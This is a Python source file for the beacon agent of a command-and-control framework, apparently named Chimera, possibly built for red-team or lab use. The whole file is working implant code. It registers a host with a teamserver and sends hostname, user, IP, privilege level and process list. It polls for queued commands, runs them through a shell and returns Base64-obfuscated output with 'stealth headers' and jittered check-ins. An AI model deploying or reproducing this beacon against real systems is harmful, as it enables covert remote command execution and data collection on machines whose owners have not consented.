import getpass
import json
import os
import platform
import random
import socket
import subprocess
import sys
import time
import uuid

import requests

try:
    from agent.obfuscation import encode_payload, decode_payload, get_stealth_headers
except ImportError:
    try:
        from obfuscation import encode_payload, decode_payload, get_stealth_headers
    except ImportError:
        def encode_payload(raw_text: str) -> str:
            import base64
            return base64.b64encode(raw_text.encode("utf-8")).decode("utf-8") if raw_text else ""

        def decode_payload(encoded_text: str) -> str:
            import base64
            try:
                return base64.b64decode(encoded_text.encode("utf-8")).decode("utf-8") if encoded_text else ""
            except Exception:
                return encoded_text

        def get_stealth_headers() -> dict:
            return {"Content-Type": "application/json"}

try:
    from agent.modules.triage import collect_system_survey
except ImportError:
    try:
        from modules.triage import collect_system_survey
    except ImportError:
        collect_system_survey = None


# Dynamic configuration with interactive fallback and environment variable support
def _resolve_server_url() -> str:
    env_url = os.environ.get("SERVER_URL")
    if env_url:
        return env_url.rstrip("/")

    # If run in an interactive terminal and no env var was provided
    if hasattr(sys.stdin, "isatty") and sys.stdin.isatty():
        try:
            user_input = input("Target Server URL [Press Enter for http://127.0.0.1:8000]: ").strip()
            if user_input:
                return user_input.rstrip("/")
        except (KeyboardInterrupt, EOFError):
            print()

    return "http://127.0.0.1:8000"


SERVER_URL = _resolve_server_url()
CHECKIN_INTERVAL = float(os.environ.get("CHECKIN_INTERVAL", "5.0"))

# Keep the agent identity stable across restarts (supports isolated multi-instance testing)
AGENT_ID_FILE = os.environ.get(
    "CHIMERA_AGENT_ID_FILE",
    os.path.expanduser("~/.chimera_agent_id")
)


def get_agent_id():
    """Retrieve or generate persistent agent identifier."""
    try:
        if os.path.exists(AGENT_ID_FILE):
            with open(AGENT_ID_FILE, "r", encoding="utf-8") as file:
                agent_id = file.read().strip()
            if agent_id:
                return agent_id

        agent_id = str(uuid.uuid4())[:8]
        with open(AGENT_ID_FILE, "w", encoding="utf-8") as file:
            file.write(agent_id)
        return agent_id
    except OSError as exc:
        print(f"[-] Could not persist agent ID: {exc}")
        return str(uuid.uuid4())[:8]


AGENT_ID = get_agent_id()


def get_system_info():
    """
    Gathers host telemetry matching the backend AgentRegisterSchema.
    Integrates with the triage survey module when available.
    """
    if collect_system_survey:
        try:
            survey = collect_system_survey()
            return {
                "hostname": survey.get("hostname") or socket.gethostname(),
                "os": survey.get("os") or platform.system(),
                "os_release": survey.get("os_release") or platform.release(),
                "user": survey.get("current_user") or survey.get("user") or getpass.getuser(),
                "ip": survey.get("internal_ip") or survey.get("ip") or "127.0.0.1",
                "cpu_cores": survey.get("cpu_cores") or os.cpu_count() or 1,
                "total_ram_gb": survey.get("total_ram_gb", 0.0),
                "available_ram_gb": survey.get("available_ram_gb", 0.0),
                "is_privileged": survey.get("is_privileged", False),
                "sample_processes": survey.get("sample_processes", []),
            }
        except Exception as exc:
            print(f"[-] Triage survey collection fallback: {exc}")

    # Fallback host information
    return {
        "hostname": platform.node(),
        "os": platform.system(),
        "os_release": platform.release(),
        "user": getpass.getuser(),
        "ip": "127.0.0.1",
        "cpu_cores": os.cpu_count() or 1,
        "total_ram_gb": 0.0,
        "available_ram_gb": 0.0,
        "is_privileged": os.geteuid() == 0 if hasattr(os, "geteuid") else False,
        "sample_processes": [],
    }


def register():
    """Registers agent with teamserver using stealth headers."""
    system_info = get_system_info()
    payload = {
        "agent_id": AGENT_ID,
        **system_info,
    }
    headers = get_stealth_headers()

    try:
        response = requests.post(
            f"{SERVER_URL}/api/v1/beacon/register",
            json=payload,
            headers=headers,
            timeout=5,
        )
        response.raise_for_status()

        print(f"[+] Registered Agent ID: {AGENT_ID}")
        print(
            f"[*] Host: {system_info['hostname']} | "
            f"OS: {system_info['os']} {system_info.get('os_release', '')} | "
            f"User: {system_info['user']}"
        )
        return True
    except requests.exceptions.RequestException as exc:
        print(f"[-] Registration failed: {exc}")
        return False


def execute_command(command: str):
    """Executes command locally and captures combined stdout and stderr."""
    try:
        process = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        # Capture both streams so errors are never lost
        output = (process.stdout or "") + (process.stderr or "")
        return output, process.returncode
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds.", 124
    except Exception as exc:
        return str(exc), 1


def poll_once():
    """
    Polls teamserver for queued tasks using stealth headers.
    Returns (task_dict, needs_reregistration).
    """
    headers = get_stealth_headers()
    try:
        response = requests.post(
            f"{SERVER_URL}/api/v1/beacon/poll",
            json={"agent_id": AGENT_ID},
            headers=headers,
            timeout=5,
        )
        response.raise_for_status()
        data = response.json()

        # Check if server lost state and does not recognize agent
        if data.get("error") == "unknown agent_id":
            return None, True

        # Support both {"task": {"task_id": ..., "command": ...}} and top-level formats
        task = data.get("task")
        if not task and "task_id" in data and "command" in data:
            task = data

        return task, False
    except requests.exceptions.RequestException as exc:
        print(f"[-] Beacon poll failed: {exc}")
        return None, False


def submit_result(task_id: str, output: str, exit_code: int):
    """Encodes output using Base64 obfuscation and submits results with stealth headers."""
    encoded_output = encode_payload(output)
    payload = {
        "task_id": task_id,
        "agent_id": AGENT_ID,
        "output": encoded_output,
        "exit_code": exit_code,
    }
    headers = get_stealth_headers()

    try:
        response = requests.post(
            f"{SERVER_URL}/api/v1/beacon/result",
            json=payload,
            headers=headers,
            timeout=5,
        )
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as exc:
        print(f"[-] Failed to submit result: {exc}")
        return False


def beacon_loop():
    """Main beacon loop with jitter and automatic re-registration recovery."""
    print(f"[*] Starting beacon polling loop for {AGENT_ID} (server: {SERVER_URL})...")

    while True:
        try:
            task, needs_reregister = poll_once()

            if needs_reregister:
                print("[-] Server unrecognized agent identity. Re-registering...")
                register()
            elif task:
                task_id = task.get("task_id")
                raw_command = task.get("command")

                if not task_id or not raw_command:
                    print("[-] Received malformed task payload.")
                else:
                    # Support command decoding if incoming commands are Base64 obfuscated
                    command = decode_payload(raw_command)
                    print(f"[*] Received Task [{task_id}]: {command}")

                    output, exit_code = execute_command(command)
                    submit_result(task_id, output, exit_code)
                    print(f"[+] Posted obfuscated results for Task [{task_id}]")
            else:
                print("[*] No task available.")

        except Exception as exc:
            print(f"[-] Unexpected agent loop error: {exc}")

        # Add ±20% jitter around configured check-in interval
        jitter = random.uniform(CHECKIN_INTERVAL * 0.8, CHECKIN_INTERVAL * 1.2)
        time.sleep(jitter)


if __name__ == "__main__":
    while not register():
        print("[*] Retrying initial registration in 5 seconds...")
        time.sleep(5)
    beacon_loop()
